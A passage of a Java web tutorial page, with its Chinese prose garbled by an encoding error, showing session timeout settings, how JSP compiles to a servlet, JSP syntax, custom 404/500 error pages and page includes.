class="line"><span class="comment">//session.invalidate();</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/sessionDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.SessionDemo01<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/sessionDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/sd01<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>ä¼šè¯è‡ªåŠ¨è¿‡æœŸï¼šweb.xmlé…ç½®</strong>ï¼</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--è®¾ç½®Sessioné»˜è®¤çš„å¤±æ•ˆæ—¶é—´--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--15åˆ†é’ŸåSessionè‡ªåŠ¨å¤±æ•ˆï¼Œä»¥åˆ†é’Ÿä¸ºå•ä½--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>15<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/768fb44ad49206dcc54f4e9e0fa40805--2149--image-20241020180844033.png" alt="image-20241020180844033"></p>
<h3 id="1-ä»€ä¹ˆæ˜¯JSP"><a href="#1-ä»€ä¹ˆæ˜¯JSP" class="headerlink" title="1.ä»€ä¹ˆæ˜¯JSP"></a>1.ä»€ä¹ˆæ˜¯JSP</h3><blockquote>
<p>Java Server Pages ï¼š JavaæœåŠ¡å™¨ç«¯é¡µé¢ï¼Œä¹Ÿå’ŒServletä¸€æ ·ï¼Œç”¨äºåŠ¨æ€WebæŠ€æœ¯ï¼</p>
</blockquote>
<ul>
<li>æœ€å¤§çš„ç‰¹ç‚¹ï¼š<ul>
<li>å†™JSPå°±åƒåœ¨å†™HTMLï¼›</li>
<li>åŒºåˆ«ï¼š<ul>
<li>HTMLåªç»™ç”¨æˆ·æä¾›é™æ€çš„æ•°æ®ï¼›</li>
<li>JSPé¡µé¢ä¸­å¯ä»¥åµŒå…¥JAVAä»£ç ï¼Œä¸ºç”¨æˆ·æä¾›åŠ¨æ€æ•°æ®ï¼›</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-JSPåŸç†"><a href="#2-JSPåŸç†" class="headerlink" title="2.JSPåŸç†"></a>2.JSPåŸç†</h3><p>æ€è·¯ï¼šJSPåˆ°åº•æ€ä¹ˆæ‰§è¡Œçš„ï¼</p>
<ul>
<li><p>ä»£ç å±‚é¢æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼›</p>
</li>
<li><p>æœåŠ¡å™¨å†…éƒ¨å·¥ä½œï¼š</p>
<ul>
<li>tomcatä¸­æœ‰ä¸€ä¸ªworkç›®å½•ï¼›</li>
</ul>
</li>
<li><p>IDEAä¸­ä½¿ç”¨Tomcatçš„ä¼šåœ¨IDEAçš„tomcatä¸­ç”Ÿäº§ä¸€ä¸ªworkç›®å½•ï¼›</p>
</li>
<li><p><strong>æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä¸ç®¡è®¿é—®ä»€ä¹ˆèµ„æºï¼Œå…¶å®éƒ½æ˜¯åœ¨è®¿é—®Servletï¼</strong></p>
</li>
<li><p>JSPæœ€ç»ˆä¹Ÿä¼šè¢«è½¬æ¢æˆä¸ºä¸€ä¸ªJavaç±»ï¼</p>
</li>
<li><p><strong>JSP æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªServlet</strong>ï¼</p>
</li>
<li></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspInit</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// é”€æ¯</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// JSPService</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspService</span><span class="params">(<span class="keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="keyword">final</span> javax.servlet.http.HttpServletResponse response)</span></span><br><span class="line">      <span class="keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;   </span><br></pre></td></tr></table></figure>

<ol>
<li><p>åˆ¤æ–­è¯·æ±‚ï¼›</p>
</li>
<li><p>å†…ç½®ä¸€äº›å¯¹è±¡ï¼›</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> javax.servlet.jsp.PageContext pageContext;  <span class="comment">// é¡µé¢ä¸Šä¸‹æ–‡</span></span><br><span class="line">javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> <span class="literal">null</span>;    <span class="comment">// session</span></span><br><span class="line"><span class="keyword">final</span> javax.servlet.ServletContext application;   <span class="comment">// applicationContext</span></span><br><span class="line"><span class="keyword">final</span> javax.servlet.ServletConfig config;         <span class="comment">// config</span></span><br><span class="line">javax.servlet.jsp.<span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;           <span class="comment">// out</span></span><br><span class="line"><span class="keyword">final</span> java.lang.<span class="type">Object</span> <span class="variable">page</span> <span class="operator">=</span> <span class="built_in">this</span>;               <span class="comment">// pageï¼šå½“å‰</span></span><br><span class="line">HttpServletRequest request                        <span class="comment">// è¯·æ±‚</span></span><br><span class="line">HttpServletResponse response                      <span class="comment">// å“åº”</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>è¾“å‡ºé¡µé¢å‰å¢åŠ çš„ä»£ç ï¼›</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.setContentType(<span class="string">&quot;text/html&quot;</span>);       <span class="comment">// è®¾ç½®å“åº”çš„é¡µé¢ç±»å‹</span></span><br><span class="line">pageContext = _jspxFactory.getPageContext(<span class="built_in">this</span>, request, response,</span><br><span class="line">                                          <span class="literal">null</span>, <span class="literal">true</span>, <span class="number">8192</span>, <span class="literal">true</span>);</span><br><span class="line">_jspx_page_context = pageContext;</span><br><span class="line">application = pageContext.getServletContext();</span><br><span class="line">config = pageContext.getServletConfig();</span><br><span class="line">session = pageContext.getSession();</span><br><span class="line">out = pageContext.getOut();</span><br><span class="line">_jspx_out = out;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä»¥ä¸Šçš„è¿™äº›ä¸ªå¯¹è±¡æˆ‘ä»¬å¯ä»¥åœ¨JSPé¡µé¢ä¸­ç›´æ¥ä½¿ç”¨ï¼</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/5d3981576968979702376fce9879f2ab--eb78--image-20241020181427526.png" alt="image-20241020181427526"></p>
<ul>
<li>åœ¨JSPé¡µé¢ä¸­ï¼š<ul>
<li>åªè¦æ˜¯ JAVAä»£ç å°±ä¼šåŸå°ä¸åŠ¨çš„è¾“å‡ºï¼›</li>
<li>å¦‚æœæ˜¯HTMLä»£ç ï¼Œå°±ä¼šè¢«è½¬æ¢ä¸ºï¼š</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">out.write(<span class="string">&quot;&lt;html&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  &lt;head&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;    &lt;title&gt;$Title$&lt;/title&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  &lt;/head&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  &lt;body&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  $END$\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  &lt;/body&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;&lt;/html&gt;\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>è¿™æ ·çš„æ ¼å¼ï¼Œè¾“å‡ºåˆ°å‰ç«¯ï¼</li>
</ul>
<h3 id="3-JSPåŸºç¡€è¯­æ³•"><a href="#3-JSPåŸºç¡€è¯­æ³•" class="headerlink" title="3.JSPåŸºç¡€è¯­æ³•"></a>3.JSPåŸºç¡€è¯­æ³•</h3><ul>
<li>ä»»ä½•è¯­è¨€éƒ½æœ‰è‡ªå·±çš„è¯­æ³•ï¼ŒJAVAä¸­æœ‰ï¼ŒJSP ä½œä¸ºjavaæŠ€æœ¯çš„ä¸€ç§åº”ç”¨ï¼Œå®ƒæ‹¥æœ‰ä¸€äº›è‡ªå·±æ‰©å……çš„è¯­æ³•ï¼ˆäº†è§£ï¼ŒçŸ¥é“å³å¯ï¼ï¼‰ï¼ŒJavaæ‰€æœ‰è¯­æ³•éƒ½æ”¯æŒï¼</li>
<li>é…ç½®å¿…éœ€çš„mavenç¯å¢ƒï¼š</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JavaWeb-02-Servlet<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Jsp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   Servlet ä¾èµ–   --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        JSP ä¾èµ–   --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        JSTLè¡¨è¾¾å¼çš„ä¾èµ–--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        standardæ ‡ç­¾åº“--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="JSPè¡¨è¾¾å¼"><a href="#JSPè¡¨è¾¾å¼" class="headerlink" title="JSPè¡¨è¾¾å¼**"></a>JSPè¡¨è¾¾å¼**</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%--JSPè¡¨è¾¾å¼</span><br><span class="line">  ä½œç”¨ï¼šç”¨æ¥å°†ç¨‹åºçš„è¾“å‡ºï¼Œè¾“å‡ºåˆ°å®¢æˆ·ç«¯</span><br><span class="line">  &lt;%= å˜é‡æˆ–è€…è¡¨è¾¾å¼%&gt;</span><br><span class="line">  --%&gt;</span><br><span class="line">  &lt;%= <span class="keyword">new</span> <span class="title class_">java</span>.util.Date()%&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="jspè„šæœ¬ç‰‡æ®µ"><a href="#jspè„šæœ¬ç‰‡æ®µ" class="headerlink" title="jspè„šæœ¬ç‰‡æ®µ"></a><strong>jspè„šæœ¬ç‰‡æ®µ</strong></h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%--jspè„šæœ¬ç‰‡æ®µ--%&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=<span class="number">100</span> ; i++) &#123;</span><br><span class="line">      sum+=i;</span><br><span class="line">    &#125;</span><br><span class="line">    out.println(<span class="string">&quot;&lt;h1&gt;Sum=&quot;</span>+sum+<span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">  %&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>è„šæœ¬ç‰‡æ®µçš„å†å®ç°</strong></li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    out.println(x);</span><br><span class="line">  %&gt;</span><br><span class="line">  &lt;p&gt;è¿™æ˜¯ä¸€ä¸ªJSPæ–‡æ¡£&lt;/p&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    out.println(num);</span><br><span class="line">  %&gt;</span><br><span class="line"></span><br><span class="line">  &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%--åœ¨ä»£ç åµŒå…¥HTMLå…ƒç´ --%&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  %&gt;</span><br><span class="line">  &lt;h1&gt;Hello,World  &lt;%=i%&gt; &lt;/h1&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">    &#125;</span><br><span class="line">  %&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="JSPå£°æ˜"><a href="#JSPå£°æ˜" class="headerlink" title="JSPå£°æ˜"></a>JSPå£°æ˜</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%!</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Loading Servlet!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">globalVar</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">guo</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;è¿›å…¥äº†æ–¹æ³•guoï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  %&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>JSPå£°æ˜ï¼šä¼šè¢«ç¼–è¯‘åˆ°JSPç”ŸæˆJavaçš„ç±»ä¸­ï¼å…¶ä»–çš„ï¼Œå°±ä¼šè¢«ç”Ÿæˆåˆ°_jspServiceæ–¹æ³•ä¸­ï¼</p>
</li>
<li><p>åœ¨JSPï¼ŒåµŒå…¥Javaä»£ç å³å¯ï¼</p>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%%&gt;</span><br><span class="line">&lt;%=%&gt;</span><br><span class="line">&lt;%!%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--æ³¨é‡Š--%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>JSPçš„æ³¨é‡Šï¼Œä¸ä¼šåœ¨å®¢æˆ·ç«¯æ˜¾ç¤ºï¼ŒHTMLå°±ä¼šï¼</li>
</ul>
<h3 id="4-JSPæŒ‡ä»¤"><a href="#4-JSPæŒ‡ä»¤" class="headerlink" title="4.JSPæŒ‡ä»¤"></a>4.JSPæŒ‡ä»¤</h3><blockquote>
<p>404ä¸500é¡µé¢å®ç°</p>
</blockquote>
<ul>
<li>jsp2.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%--å®šåˆ¶é”™è¯¯é¡µé¢--%&gt;</span><br><span class="line">&lt;%--&lt;%@ page errorPage=<span class="string">&quot;error/500.jsp&quot;</span> %&gt;--%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>404.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;img src=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/img/2-404.png&quot;</span> alt=<span class="string">&quot;404&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>500.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;è‡ªå®šä¹‰<span class="number">500</span>é”™è¯¯çš„ç•Œé¢&lt;/h2&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/img/1-500.png&quot;</span> alt=<span class="string">&quot;500&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>web.xml</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error/404.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error/500.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¤´éƒ¨å’Œå°¾éƒ¨é¡µé¢æ‹¼æ¥</p>
</blockquote>
<ul>
<li>footer.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;footer&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;æˆ‘æ˜¯footer&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>header.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;head&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;æˆ‘æ˜¯header&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>jsp3.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;jsp3&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;%-- <span class="meta">@include</span>ä¼šå°†ä¸¤ä¸ªé¡µé¢åˆäºŒä¸ºä¸€ --%&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%<span class="meta">@include</span> file=<span class="string">&quot;common/header.jsp&quot;</span>%&gt;</span><br><span class="line">    &lt;h1&gt;ç½‘é¡µä¸»ä½“&lt;/h1&gt;</span><br><span class="line">    &lt;%<span class="meta">@include</span> file=<span class="string">&quot;common/footer.jsp&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%--</span><br><span class="line">        jspæ ‡ç­¾</span><br><span class="line">        jsp:includeï¼šæ‹¼æ¥é¡µé¢ï¼Œæœ¬è´¨è¿˜æ˜¯ä¸‰ä¸ª</span><br><span class="line">    --%&gt;</span><br><span class="line">    &lt;jsp:include page=<span class="string">&quot;/common/header.jsp&quot;</span>/&gt;</span><br><span class="line">    &lt;h1&gt;ç½‘é¡µä¸»ä½“&lt;/h1&gt;</span><br><span class="line">    &lt;jsp:include page=<span class="string">&quot;/common/footer.jsp&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



